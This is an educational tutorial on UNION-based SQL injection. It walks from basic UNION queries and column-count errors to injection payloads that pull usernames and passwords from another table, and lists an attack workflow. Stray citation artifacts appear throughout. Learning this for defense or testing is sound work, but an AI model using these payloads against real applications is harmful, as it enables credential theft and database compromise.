# Union Clause

So far in SQL Injection, we have mainly manipulated existing SQL queries using:
- `OR` conditions
- comments (`--`, `#`)
- authentication bypass techniques

These techniques help us change the logic of the original query.

However, another powerful type of SQL Injection exists:
```text
UNION-based SQL Injection
```

This technique allows attackers to:
- inject entirely new SQL queries
- combine query results
- extract data from other tables
- dump usernames, passwords, database names, and much more

:contentReference[oaicite:0]{index=0}

---

# Understanding the UNION Clause

The SQL `UNION` operator is used to:
```text
Combine the results of multiple SELECT statements
```

This means attackers can force the database to return data from completely different tables.

---

# Basic UNION Example

Suppose we have a table named `ports`.

```sql
SELECT * FROM ports;
```

Output:

```text
+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

:contentReference[oaicite:1]{index=1}

---

Now another table named `ships`.

```sql
SELECT * FROM ships;
```

Output:

```text
+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
```

:contentReference[oaicite:2]{index=2}

---

# Combining Both Tables with UNION

```sql
SELECT * FROM ports UNION SELECT * FROM ships;
```

Output:

```text
+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
```

:contentReference[oaicite:3]{index=3}

---

# What Happened Here?

The `UNION` operator merged:
- results from `ports`
- results from `ships`

into:
```text
a single combined output
```

This is the core concept behind:
```text
UNION-based SQL Injection
```

Attackers abuse this behavior to retrieve sensitive data from other database tables.

---

# Important Rule of UNION

For UNION to work correctly:
```text
Both SELECT statements must return the same number of columns
```

This is one of the most important concepts in UNION Injection.

---

# Example of Column Mismatch Error

```sql
SELECT city FROM ports UNION SELECT * FROM ships;
```

Error:

```text
ERROR 1222 (21000): The used SELECT statements have a different number of columns
```

:contentReference[oaicite:4]{index=4}

---

# Why This Error Happens

Because:

First query:
```sql
SELECT city FROM ports
```

returns:
```text
1 column
```

Second query:
```sql
SELECT * FROM ships
```

returns:
```text
2 columns
```

Since the column counts do not match:
```text
UNION fails
```

---

# UNION Injection Concept

Suppose the vulnerable query is:

```sql
SELECT * FROM products WHERE product_id = 'user_input'
```

:contentReference[oaicite:5]{index=5}

If an attacker injects:

```sql
1' UNION SELECT username, password FROM passwords-- -
```

the final query becomes:

```sql
SELECT * FROM products WHERE product_id='1'
UNION
SELECT username,password FROM passwords-- -
```

---

# What This Does

Instead of only showing product data:
```text
The application now also returns usernames and passwords
```

from another table.

This is how attackers dump:
- credentials
- emails
- API keys
- tokens
- sensitive database content

---

# Problem: Unequal Columns

In real-world applications:
```text
The original query usually does NOT have the same number of columns
```

as the injected query.

So attackers must adjust their payload carefully.

---

# Handling Unequal Columns

Suppose:
```sql
products
```

table has:
```text
2 columns
```

but we only want:
```sql
username
```

from another table.

We must fill remaining columns with:
```text
junk values
```

to maintain the correct column count.

---

# Example

```sql
UNION SELECT username,2 FROM passwords
```

:contentReference[oaicite:6]{index=6}

---

# Why Use `2`?

Because:
```text
UNION requires the same number of columns
```

So:
- `username` fills first column
- `2` fills second column

This keeps the query structurally valid.

---

# Using Junk Data

Attackers commonly use:
- numbers
- strings
- NULL values

Examples:

```sql
UNION SELECT username,'junk'
```

```sql
UNION SELECT username,1
```

```sql
UNION SELECT username,NULL
```

---

# Why NULL is Useful

`NULL` works with:
```text
almost every data type
```

So advanced attackers often prefer:

```sql
UNION SELECT username,NULL,NULL
```

---

# Larger Column Example

Suppose original query returns:
```text
4 columns
```

Injection becomes:

```sql
UNION SELECT username,2,3,4 FROM passwords-- -
```

:contentReference[oaicite:7]{index=7}

---

# Result

```text
+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |     2     |     3     |     4     |
+-----------+-----------+-----------+-----------+
```

:contentReference[oaicite:8]{index=8}

---

# Understanding the Output

The actual sensitive data:
```text
admin
```

appears in:
```text
Column 1
```

while:
```text
2,3,4
```

are only placeholders.

---

# Why Attackers Use Numbers

Using numbers helps attackers:
- track payload positions
- identify visible columns
- understand page rendering
- prepare for data extraction

For example:

```sql
UNION SELECT 1,2,3,4
```

helps determine:
```text
Which columns appear on the webpage
```

---

# Core UNION Injection Workflow

Most UNION attacks follow this process:

1. Find SQL Injection
2. Determine column count
3. Identify visible columns
4. Inject UNION SELECT
5. Extract database information
6. Dump sensitive data

---

# Important Concepts to Remember

## 1. UNION Combines Query Results

```sql
SELECT ... UNION SELECT ...
```

merges outputs together.

---

## 2. Column Counts Must Match

Both queries must return:
```text
same number of columns
```

---

## 3. Data Types Must Match

Column types should also be compatible.

Example:
- strings with strings
- integers with integers

Otherwise:
```text
SQL errors occur
```

---

## 4. Junk Values are Used for Padding

Attackers use:
- numbers
- strings
- NULL

to fill unused columns.

---

## 5. NULL is Common in Advanced SQLi

Because:
```text
NULL fits most data types
```

---

# Why UNION Injection is Dangerous

UNION Injection can expose:
- usernames
- passwords
- hashes
- session tokens
- emails
- internal database structure
- API secrets

It often leads to:
```text
Full database compromise
```
